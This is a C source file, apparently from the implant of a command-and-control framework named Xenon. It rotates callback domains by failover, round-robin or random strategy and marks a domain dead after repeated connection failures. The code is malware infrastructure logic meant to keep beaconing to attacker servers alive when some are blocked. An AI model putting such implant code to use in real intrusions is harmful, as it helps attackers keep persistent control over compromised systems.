#include "Xenon.h"
#include "Config.h"
#include "Utils.h"
#include "Strategy.h"

#if defined(HTTPX_TRANSPORT)

ULONG Seed = 0xd3adb33f;


/**
 * @brief Function to find the next NOT DEAD domain
 * @param [in] start Current location in Linked list
 * 
 * @returns PCALLBACK_NODE pointer to new callback domain
 */
PCALLBACK_NODE FindNextAlive(PCALLBACK_NODE start) {
    PCALLBACK_NODE next = start;

    while (TRUE) {
        if (next->next != NULL) {       
            next = next->next;                          // There is a next item
        } else {
            next = xenonConfig->CallbackDomainHead;     // No next item, set back to head
        }

        if (next->isDead == FALSE)
            return next;
        
        if (next == start) {
            _err("No Alive Domains Left...not sure what to do");
            return start;
        }
    }

    return NULL;
}


/**
 * @brief Switch callback host based on designated strategy (Failover | RoundRobin | Random).
 * @param [in] isConnectionSuccess Network request result
 * @param [inout] attempts Number of failed connection attempts to current callback host
 */
VOID StrategyRotate(_In_ BOOL isConnectionSuccess, _Inout_ int* attempts)
{
#define MAX_FAILED      5          // By default, gives each 5 tries before marked DEAD

#define ROUNDROBIN      0
#define FAILOVER        1
#define RANDOM          2

    // Check fail count for host
    if (isConnectionSuccess == FALSE) {
        xenonConfig->CallbackDomains->failCount++;
        
        if (xenonConfig->CallbackDomains->failCount == MAX_FAILED) {
            _dbg("Reached Max Failure for Host, Setting %s --> DEAD", xenonConfig->CallbackDomains->hostname);
            xenonConfig->CallbackDomains->isDead = TRUE;
        }
    }

    switch (xenonConfig->rotationStrategy)
    {
        case FAILOVER:
        {
            // Failover: rotate only if the connection failed and exceeds threshold            
            if (isConnectionSuccess == FALSE && *attempts >= xenonConfig->failoverThreshold) {
                
                _dbg("[Failover] Rotating to next domain...");
                
                xenonConfig->CallbackDomains = FindNextAlive(xenonConfig->CallbackDomains);

                *attempts = 0; // Reset after switching to a new domain
            }

            break;
        }

        case ROUNDROBIN:
        {
            // Round-robin: Always rotate to the next available domain
            _dbg("[Roundrobin] Rotating to next available domain...");

            xenonConfig->CallbackDomains = FindNextAlive(xenonConfig->CallbackDomains);

            break;
        }

        case RANDOM:
        {
            // Random: Rotate a random number of times
            INT max = 10;
            INT RandNmbr = PseudoRandomIntegerSubroutine(&Seed, max);
            _dbg("[Random] Rotating to next domain %d times...", RandNmbr);

            for (INT i = 0; i < RandNmbr; i++) {
                xenonConfig->CallbackDomains = FindNextAlive(xenonConfig->CallbackDomains);
            }

            break;
        }

        default:
            break;
    }
}

#endif //HTTPX_TRANSPORT